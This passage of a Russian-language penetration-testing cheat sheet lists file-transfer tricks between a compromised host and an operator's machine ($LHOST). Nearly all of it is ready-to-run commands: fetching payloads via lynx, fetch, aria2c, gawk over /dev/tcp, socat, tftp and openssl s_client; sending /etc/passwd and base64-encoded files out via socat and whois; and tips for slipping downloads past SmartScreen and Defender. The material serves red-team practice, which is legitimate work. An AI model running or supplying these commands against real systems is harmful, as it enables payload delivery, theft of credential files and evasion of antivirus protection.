lynx -source http://$LHOST/payload.sh > payload.sh
```

### Fetch (BSD)

> **Путь:** `/usr/bin/fetch`

**Штатная качалка FreeBSD/pfSense/OPNsense:**
```bash
fetch http://$LHOST/payload.sh
```

### aria2c

> **Путь:** `/usr/bin/aria2c`

**Мощный загрузчик (HTTP/FTP, докачка, многопоточно):**
```bash
aria2c -o payload.sh http://$LHOST/payload.sh
```

### axel

> **Путь:** `/usr/bin/axel`

**Быстрый многопоточный загрузчик:**
```bash
axel -o payload.sh http://$LHOST/payload.sh
```

### Perl LWP (`GET` / `lwp-request`)

> **Путь:** `/usr/bin/GET` (пакет `libwww-perl`)

**Простая качалка из пакета Perl LWP:**
```bash
GET http://$LHOST/payload.sh > payload.sh
```

### git

> **Путь:** `/usr/bin/git`

**Скачать репозиторий (или `git archive` для подкаталога):**
```bash
git clone https://github.com/user/tools.git /tmp/tools
```

### gawk (через /dev/tcp)

> **Путь:** `/usr/bin/gawk`

**Когда нет ни wget/curl, ни python, но есть `gawk` — качаем по HTTP (только текст; для бинарей лучше base64):**
```bash
gawk -v h="$LHOST" 'BEGIN{
  cmd="bash -c '\''exec 3<>/dev/tcp/"h"/80; printf \"GET /file.bin HTTP/1.0\\r\\nHost: "h"\\r\\n\\r\\n\" >&3; cat <&3'\''"
  while((cmd | getline line) > 0) print line > "/tmp/file.bin"
  close(cmd)
}'
```

**Обрезать HTTP-заголовки:**
```bash
sed -i '1,/^\r*$/d' /tmp/file.bin
```

**Вариант на «чистом» gawk через спецфайл `/inet` (нужен gawk с сетью; в mawk `/inet` нет):**
```bash
gawk -v h="$LHOST" 'BEGIN{
  s="/inet/tcp/0/"h"/80"
  print "GET /file.bin HTTP/1.0\r\nHost: "h"\r\n\r" |& s
  while((s |& getline line) > 0) print line
}' > /tmp/file.bin
```

```bash
sed -i '1,/^\r*$/d' /tmp/file.bin
```

### socat

> **Путь:** `/usr/bin/socat`

**Download - одной строкой (на LHOST: `socat TCP-LISTEN:9000,reuseaddr,fork OPEN:payload.sh`):**
```bash
socat -u TCP:$LHOST:9000 OPEN:/tmp/payload.sh,creat
```

**TLS-вариант (LHOST: `socat OPENSSL-LISTEN:443,cert=cert.pem,verify=0,fork OPEN:payload.sh`):**
```bash
socat -u OPENSSL:$LHOST:443,verify=0 OPEN:/tmp/payload.sh,creat
```

**Upload на TCP-листенер оператора:**
```bash
socat -u FILE:/etc/passwd TCP:$LHOST:9000
```

### tftp

> **Путь:** `/usr/bin/tftp`

**Древний, но живой на сетевом железе/embedded (UDP/69):**
```bash
tftp $LHOST -c get payload.sh
```

```bash
tftp $LHOST -c put data.tar
```

### whois

> **Путь:** `/usr/bin/whois`

**Мини TCP-клиент к произвольному host:port — данные в запросе, приём на LHOST (`nc -lvnp 43 > data.txt`); только текст/небольшие строки:**
```bash
whois -h $LHOST -p 43 "$(base64 -w0 /tmp/sample.txt)"
```

### ssh

> **Путь:** `/usr/bin/ssh`

**Если есть SSH, но нет scp/sftp - качаем/льём через `cat`:**
```bash
ssh $LHOST_user@$LHOST "cat /remote/file" > local_file
```

```bash
cat local_file | ssh $LHOST_user@$LHOST "cat > /remote/file"
```

### docker cp

> **Путь:** `/usr/bin/docker`

**Если доступен docker-сокет - вытащить файл из контейнера/образа:**
```bash
CONTAINER=mycontainer
docker cp "$CONTAINER":/path/file ./file
```

### NFS mount

> **Путь:** `/usr/bin/mount`

**Если экспортирован NFS - монтируем и копируем как обычно:**
```bash
sudo mount -t nfs $LHOST:/export /mnt && cp /mnt/file .
```

---

## 6. openssl s_server / s_client (передача по TLS)

> **Путь:** `/usr/bin/openssl`

Когда нужен зашифрованный канал без полноценного веб-сервера.

**LHOST SHELL - генерим сертификат:**
```bash
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
```

**LHOST SHELL - поднимаем сервер и отдаём файл (порт 80 требует root; можно взять 4443):**
```bash
openssl s_server -quiet -accept 4443 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
```

**RHOST SHELL - принимаем файл:**
```bash
openssl s_client -connect $LHOST:4443 -quiet > LinEnum.sh
```

**LHOST SHELL - или раздать файлы как HTTPS-сервер (`-WWW` = из текущего каталога; 443 требует root):**
```bash
openssl s_server -accept 8443 -cert certificate.pem -key key.pem -WWW
```

---

## 7. Заметки

> **Куда падает файл у «URL-загрузчиков».** Многие (`InstallUtil`, `Ngen`, `Presentationhost`, `Xwizard`, `mshta`, `msoxmled`, `ECMangen`, офисные приложения, `Scrobj.dll`, `PhotoViewer.dll`, `Shimgvw.dll`) кладут payload в **`INetCache`**: `%LOCALAPPDATA%\Microsoft\Windows\INetCache\`. Ищи там, если «скачал, но файла нет».
>
> **SmartScreen/AV.** Для `msedge.exe` добавляй безобидное расширение (`.txt`, `.zip`); `MpCmdRun.exe` лучше копировать из папки платформы Defender и запускать оттуда.
>
> **Текстовые vs бинарные.** `findstr`, `print`, `type` и `lynx` работают построчно/как текст - для бинарей используем `certutil`, `esentutl`, `extrac32`, `socat`, `nc`.
>
> **UNC-методы** (`type`, `esentutl`, `expand`, `extrac32`, `replace`, `print`, `makecab`, `diantz`) требуют поднятой шары оператора - [03](03-smb.md)/[04](04-webdav.md).
>
> **Upload-методы**: `ConfigSecurityPolicy` (файл, затем URL!), `CertReq -Post`, `DataSvcUtil`, `type > \\host\share`, `TestWindowRemoteAgent` (DNS). Приёмники - [02](02-target-to-attacker.md).
>
> **Свежесть.** Список меняется с выходом патчей Windows - сверяйся с [LOLBAS](https://lolbas-project.github.io/) и [GTFOBins](https://gtfobins.github.io/).

---

**См. также:** [01 - Attacker → Target](01-attacker-to-target.md) · [02 - Target → Attacker](02-target-to-attacker.md) · [03 - SMB](03-smb.md) · [04 - WebDAV](04-webdav.md) · [05 - FTP](05-ftp.md) · [06 - SCP/SFTP](06-scp-sftp-rsync.md) · [07 - Netcat](07-netcat.md) · [12 - DNS / ICMP](12-dns-icmp.md)

---

## Формы переменных

**Linux (bash)**
```bash
export LHOST=192.168.2.5
export RHOST=192.168.10.20
export DOMAIN=t.attacker.com
# использование: $LHOST
```

**Windows (CMD)**
```cmd
set LHOST=192.168.2.5
set RHOST=192.168.10.20
set DOMAIN=t.attacker.com
:: использование: %LHOST%
```

**Windows (PowerShell)**
```powershell
$LHOST = "192.168.2.5"
$RHOST = "192.168.10.20"
$DOMAIN = "t.attacker.com"
# использование: $LHOST
```

Подробнее - [README](../../README_RU.md#обозначения-и-переменные).

---

[← Назад к справочнику](../../README_RU.md)
